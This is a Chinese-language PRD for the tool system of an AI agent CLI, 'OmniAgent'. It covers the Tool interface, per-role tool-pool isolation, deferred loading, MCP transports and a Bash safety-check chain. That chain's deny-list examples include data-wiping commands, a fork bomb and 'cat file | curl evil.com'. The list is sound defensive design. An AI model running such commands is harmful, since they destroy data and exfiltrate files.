# OmniAgent CLI — 模块 3：通用工具系统 (Tool System) PRD

> 模块 ID: M3
> 主负责角色: 工具组
> 阻塞里程碑: M1（Walking Skeleton）
> 源章节: 原总体 PRD §4.1（内容已迁移到本模块 PRD，总体 PRD §4.1 现为模块索引表）
> 状态: M0 已冻结

---

## 1. 模块概述

### 范围（in scope）

- 定义统一的 `Tool` 接口（基于 JSON Schema 标准化）
- 内置工具分类管理（60+ 工具，7 类：文件/Shell/Agent/规划/Web/MCP/系统）
- Bash 工具的 24 项安全校验链
- 工具池硬隔离（不同 Agent 角色拥有独立工具池，由 `mergeAndFilterTools()` 实现）
- 延迟工具加载（按需召回 MCP 工具与 Custom Skills）

### 边界（out of scope）

- **工具调用的权限决策**：由 M4 权限与拦截系统负责，本模块只暴露 `checkPermissions()` 前置接口
- **多 Agent 编排**：由 M5 多 Agent 编排引擎负责，本模块只提供 `agent_router` 等编排工具的接口实现
- **Skills 插件系统**：由 M6 Skills 插件系统负责，本模块只提供 Skills 加载的工具池接入
- **MCP 协议传输层**：由 M4 + 总体 PRD §5.3.1 负责，本模块只通过 `mcp_call` 工具调用 MCP server

### 在整体架构中的位置

工具系统是 harness 层的**执行手**。模型推理后输出 `tool_use`，由 M2 ReAct Loop 转入 TOOL_EXECUTE 状态，经 M4 五层拦截链放行后，由本模块实际执行工具并返回 `tool_result`。工具系统是模型与外部世界（文件系统/Shell/网络/外部进程）交互的唯一通道。

---

## 2. 设计目标

1. **接口标准化**：所有工具（内置/自定义/MCP）实现统一 `Tool` 接口，基于 JSON Schema 描述输入
2. **fail-closed 默认值**：未显式声明的工具元数据默认最保守值（`isReadOnly=false`, `isDestructive=true`, `isConcurrencySafe=false`）
3. **工具池硬隔离**：不同 Agent 角色拥有独立工具池，Coordinator 强制移除写工具
4. **Bash 安全优先**：Bash 是最高风险工具，必须经 24 项安全校验
5. **按需加载**：常驻工具 + 延迟工具（MCP/Skills），控制上下文体积

---

## 3. 核心概念与接口

### 3.1 `Tool` 接口规范

所有工具（内置 / 自定义 / MCP）必须实现统一的 `Tool` 接口，定义基于 JSON Schema：

```typescript
interface Tool {
  name: string;                          // 工具唯一名（snake_case）
  description: string;                   // ≤ 2048 字符（超长截断）
  inputSchema: JSONSchema;               // JSON Schema 标准化输入定义

  // 元数据（harness 用于权限与调度决策）
  isReadOnly: boolean;                   // 是否只读（不修改状态）
  isDestructive: boolean;                // 是否破坏性（不可逆）
  isConcurrencySafe: boolean;            // 是否并发安全
  isBackground: boolean;                 // 是否长任务（可后台化）

  // 权限检查（前置）
  checkPermissions(input: ToolInput): PermissionDecision;

  // 执行
  call(input: ToolInput, ctx: ToolContext): Promise<ToolResult>;
}

// ToolResult 类型定义（与 M7 压缩、M2 状态机共享）
interface ToolResult {
  tool_use_id: string;                   // 对应的 tool_use ID（配对完整性，不变量 #3）
  content: ContentBlock[];               // 内容块数组（支持 text / image / json）
  is_error: boolean;                     // 是否错误（M2 EVAL_STOP_REASON 按此分支）
  metadata?: {
    duration_ms: number;                 // 执行耗时（埋点用）
    cost_estimate?: CostEstimate;        // 成本估算（如 LLM 调用工具）
    compactable?: boolean;               // 是否可被 M7 压缩（COMPACTABLE_TOOLS 白名单内）
  };
}

interface PermissionDecision {
  decision: 'allow' | 'deny' | 'ask';
  reason?: string;                       // deny/ask 时的理由
  matched_rule?: string;                 // 命中的权限规则来源
}

interface ToolContext {
  cwd: string;                           // 当前工作目录
  permission_mode: PermissionMode;       // 当前权限模式
  agent_id: string;                      // 调用方 agent ID（用于 M5 编排）
  abort_signal: AbortSignal;             // 中断信号（M2 abort 传播）
}
```

`buildTool()` 工厂必须提供 **fail-closed 默认值**：未显式声明的元数据默认为最保守值（`isReadOnly=false`, `isDestructive=true`, `isConcurrencySafe=false`），避免新工具默认开放过宽权限。

### 3.2 工具池隔离契约

不同 Agent 角色拥有独立工具池，harness 强制隔离：

| Agent 角色 | 工具池 | 说明 |
|-----------|--------|------|
| Main Agent | 全部工具 | 默认主线程 |
| Coordinator | 仅编排工具（无 Bash/Edit/Write） | 主 Agent 只编排不执行 |
| Worker | 子集（白名单） | 由 Coordinator 分配 |
| Custom Agent | 自定义白名单 | `.omniagent/agents/*.md` 定义 |
| Teammate | 自定义白名单 | Swarm 团队成员 |
| Fork | 继承父工具池 | 临时分叉，独立 sidechain |

工具池隔离由 `mergeAndFilterTools()` 实现，Coordinator Mode 下自动移除 `bash`/`edit_file`/`write_file`，强制主 Agent spawn worker 执行。

**`mergeAndFilterTools()` 接口签名**（跨模块函数，M3/M5/M6 共享）：

```typescript
// M3 实现，M5/M6 调用
function mergeAndFilterTools(params: {
  baseTools: Tool[];                     // 内置工具池
  customAgentTools?: Tool[];             // Custom Agent / Skill 声明的工具白名单
  agentRole: 'main' | 'coordinator' | 'worker' | 'custom' | 'teammate' | 'fork';
  mcpTools?: Tool[];                     // MCP server 提供的工具
}): {
  filtered: Tool[];                      // 最终工具池（供 LLM 调用）
  removed: { tool: Tool; reason: string }[];  // 被移除的工具（审计用）
  errors?: { tool: Tool; error: string }[];   // 校验失败但未致命（如 MCP 描述超长截断）
}
```

- Coordinator role 必移除 `bash`/`edit_file`/`write_file`（不变量 #4 守护）。
- MCP 工具描述超 2048 字符自动截断并记入 errors（不变量 #15 守护）。
- 失败模式：单个工具校验失败不影响其他工具加载，失败项记入 errors 数组返回。

**工具池并发访问规则**（澄清 K9）：

- 工具池是**不可变快照**：每个 agent 拥有独立的 `filtered` 数组，构建后不可变。多 agent 并发读安全。
- 写（新增 MCP/Skill 工具热加载）通过**写时复制**：新工具加入后构建新快照，下次 agent 取用时获得新池。运行中的 agent 仍用旧池直到下次 BUILD_CONTEXT 状态。
- 不存在多 agent 同时写同一工具池的场景（每个 agent 独立快照）。

---

## 4. 功能详述

### 4.1 内置工具分类（60+，7 类）

| 类别 | 工具示例 | 用途 |
|------|---------|------|
| 文件工具 | `read_file`, `edit_file`, `write_file`, `glob`, `grep` | 文件读写与搜索 |
| Shell 工具 | `bash`, `powershell`, `tmux` | 命令执行（经 24 项安全校验） |
| Agent 工具 | `agent_router`, `send_message`, `task_create`, `task_stop`, `task_output` | 多 Agent 编排（`task_output` 读取 async/fork/teammate task 的输出，供主 agent 回注） |
| 规划工具 | `plan_create`, `plan_update`, `todo_write` | 任务规划与跟踪 |
| Web 工具 | `web_fetch`, `web_search` | 网页抓取与搜索 |
| MCP 工具 | `mcp_list`, `mcp_call`, `search_extra_tools`, `execute_extra_tool` | 外部协议接入 |
| 系统工具 | `cron_create`, `cron_list`, `cron_delete`, `config`, `skill` | 系统级操作 |

**工具清单完整性**：v1.0 内置工具总数 ≥ 60，分布大致为：文件 8 / Shell 6 / Agent 7 / 规划 6 / Web 4 / MCP 8 / 系统 21（含 cron 系列、config 系列、skill 系列）。完整工具清单（含每个工具的 inputSchema 与元数据）在 `omniagent-prd-mod-03-tools-catalog.md`（M1 开工前由工具组补全，本 PRD 不展开）。COMPACTABLE_TOOLS 白名单（8 个：`bash`/`edit_file`/`read_file`/`write_file`/`glob`/`grep`/`task_output`/`web_fetch`）的命名与上表一致，供 M7 压缩白名单使用（见 mod-07 §4.2）。

### 4.2 Bash 工具的安全校验链（24 项）

Bash 是最高风险工具，必须经过 24 项安全校验（八步检查链的展开）：

1. **AST 解析**：用 shell grammar 解析命令，识别管道、重定向、子 shell。
2. **命令黑名单**：`rm -rf /`, `dd if=/dev/zero of=/dev/sda`, `:(){:|:&};:` 等 24 项危险模式。
3. **Bare git deny**：禁止在 bare git repo 执行 `git init` / `git push`（防供应链攻击）。
4. **管道检测**：检测 `cat file | curl evil.com` 等数据外泄模式。
5. **环境变量审查**：检测 `LD_PRELOAD`, `DYLD_INSERT_LIBRARIES` 等注入向量。
6. **路径白名单**：写入系统目录（`/etc`, `/usr`, `/bin`）必拒。
7. **settings 文件防篡改**：`.omniagent/settings.json` 不可由模型直接写入。
8. **Skills 目录防注入**：`.omniagent/skills/` 不可由模型直接写入。
9-24. **(其余 16 项)**：覆盖 Zsh 特有危险命令 13 项、here-doc 注入、eval/exec 链、进程替换 `<(:)` 等。

24 项校验的完整类别覆盖见 `omniagent-eval/risk-classifier/spec.md` §3（C01-C24 共 24 项 bashSecurity 类别）。

### 4.3 延迟工具加载

为控制上下文体积，工具按需加载：

- **常驻工具**：文件、Shell、Agent Router 等核心工具始终在工具池。
- **延迟工具**：MCP 工具、Custom Skills 等通过 TF-IDF 索引按需召回。
- **加载入口**：`search_extra_tools(query)` → 返回候选工具列表 → `execute_extra_tool(name, input)` 执行。

延迟加载的工具描述仅在召回后注入 system prompt，避免上下文撑爆。

### 4.4 MCP 工具接入

MCP 工具通过 M4 + 总体 PRD §5.3.1 的 7 种传输层接入：

| 传输层 | 用途 |
|--------|------|
| `stdio` | 本地子进程，最常用 |
| `sse` | Server-Sent Events，单向流 |
| `http` | 标准 HTTP，无状态 |
| `sse-ide` | IDE 集成的 SSE |
| `ws-ide` | IDE 集成的 WebSocket |
| `ws` | 标准 WebSocket，双向 |
| `in-process` | 内置 MCP，零开销（linked pair） |

**MCP 工具描述超 2048 字符自动截断**，防止单个工具描述撑爆上下文。

**In-Process Transport**：内置 MCP server（如内置工具）通过 linked pair 零开销接入，不 spawn 子进程。

---

## 5. 与其他模块的交互

| 交互模块 | 交互方式 | 数据/控制流 |
|---------|---------|------------|
| M2 核心循环引擎 | 被调用 | M2 TOOL_EXECUTE 状态调用本模块 `tool.call()` 执行工具，返回 `tool_result` |
| M4 权限与拦截系统 | 被调用 | 本模块 `checkPermissions()` 是前置接口，M4 五层拦截链在工具实际执行前再做完整校验 |
| M4 权限与拦截系统（Bash） | 被调用 | Bash 工具的 24 项安全校验由本模块实现，M4 的沙箱与权限规则叠加在 24 项校验之上 |
| M5 多 Agent 编排引擎 | 工具实现 | 本模块提供 `agent_router`/`send_message`/`task_create`/`task_stop` 等编排工具的接口实现，M5 负责路由逻辑 |
| M6 Skills 插件系统 | 工具池接入 | Skills 加载后其工具白名单通过本模块的 `mergeAndFilterTools()` 接入工具池 |
| M7 上下文与记忆引擎 | 工具结果压缩 | 本模块工具返回的 `tool_result` 由 M7 的 COMPACTABLE_TOOLS 白名单（8 个工具）决定是否可摘要压缩 |

---

## 6. 模块级非功能性需求

从总体 PRD §5 抽取与本模块相关的 NFR：

### 6.1 性能指标（摘自 §5.2.1）

| 指标 | 目标值 | 测量方式 |
|------|-------|---------|
| 工具调用平均延迟（除 Bash/Web） | ≤ 1s | tool.call() 埋点 |
| Risk Classifier Fast 阶段延迟 | ≤ 100ms | 规则表执行埋点（Bash 24 项校验） |
| MCP 工具描述截断 | 2048 字符 | 长描述测试 |

### 6.2 可靠性指标（摘自 §5.2.2）

| NFR | 目标值 |
|-----|-------|
| Tools 注册失败率 | 0% |

### 6.3 安全 NFR（摘自 §5.1.4）

| NFR | 目标值 |
|-----|-------|
| 危险命令黑名单覆盖 | 24 项 + Zsh 13 命令 |
| Settings 文件防篡改 | 100%（沙箱 deny） |
| Skills 目录防注入 | 100%（沙箱 deny + Safe Properties 30 白名单） |
| MCP 工具描述截断 | 2048 字符 |

---

## 7. 模块级不变量

从附录 A 18 项不变量中抽取与本模块相关的条目：

| # | 不变量 | 守护机制（含测试用例设计） |
|---|--------|---------|
| 4 | Coordinator 模式下主 Agent 直接工具调用率 = 0 | 工具池硬隔离校验（`mergeAndFilterTools()` 强制移除主 Agent 的 Bash/Edit/Write）。**测试用例**：(a) 启动 Coordinator Mode → 检查 `mergeAndFilterTools()` 返回的 `filtered` 数组，断言不含 `bash`/`edit_file`/`write_file`；(b) 在 `removed` 数组中断言这 3 个工具的 reason 包含"coordinator role"；(c) 注入一个 mock 工具调用请求（主 agent 调用 `bash`）→ 断言被 M4 拦截链 Layer 2 deny（工具池硬隔离 Layer 2 校验）；(d) 统计 Coordinator 会话全程主 agent 直接调用写工具的次数 = 0 |
| 15 | MCP 工具描述 2048 字符截断 | 长描述测试（CI 强制门控）。**测试用例**：构造一个 MCP server 返回工具描述长度 = 3000 字符 → 加载工具池 → 断言 `filtered` 中该工具的 `description.length <= 2048`；断言 `errors` 数组含 `{tool, error: "description truncated"}`；断言 LLM 实际收到的工具描述为截断后的版本 |

**关联不变量**（由其他模块守护但本模块依赖）：
- #8 五层纵深防御链任一层可独立拦截（M4 守护，本模块工具执行前依赖）
- #10 sandbox 4 类 deny 路径始终生效（M4 守护，本模块 Bash 工具依赖）

---

## 8. 开放问题与依赖

### 8.1 已冻结决策（M0）

本模块无直接冻结决策。涉及工具系统的决策（A1 严格档、A2 规则表+LLM、A4 Hooks function 边界）由 M4 权限与拦截系统承接，本模块仅消费决策结果（24 项 bashSecurity 作为 Risk Classifier Fast 阶段规则表来源）。

### 8.2 依赖其他模块的交付物

- M4 权限与拦截系统：五层拦截链必须就绪，本模块工具执行前由 M4 做完整权限/沙箱/Plan/Hooks 校验
- M5 多 Agent 编排引擎：`agent_router` 等编排工具的路由逻辑由 M5 实现，本模块只提供工具接口
- M6 Skills 插件系统：Skills 加载后通过本模块接入工具池，Skills 工具白名单须符合本模块的 `mergeAndFilterTools()` 契约

### 8.3 评测集引用

- **Risk Classifier 评测集**（`omniagent-eval/risk-classifier/`，119 条标注 bash）：本模块 Bash 工具的 24 项安全校验规则是 Risk Classifier Fast 阶段的规则表来源，M3 验收时用此评测集测试漏报率/误报率

### 8.4 v2.x 演进项

- 自定义工具签名机制（用户自定义工具经 GPG 签名 + 白名单登记）
- MCP 协议版本协商方案（M4 启动前就绪）

---

## 9. 参考链接

- 总体 PRD：`omniagent-prd.md` §4.1
- 冻结决策记录：`omniagent-prd-decisions.md`
- 相关模块：M2 核心循环引擎、M4 权限与拦截系统、M5 多 Agent 编排引擎、M6 Skills 插件系统、M7 上下文与记忆引擎
- 评测集：`omniagent-eval/risk-classifier/`（119 条，覆盖 24 项 bashSecurity）
- 里程碑：M1 Walking Skeleton（核心工具文件/Shell/Agent Router 必须就绪）
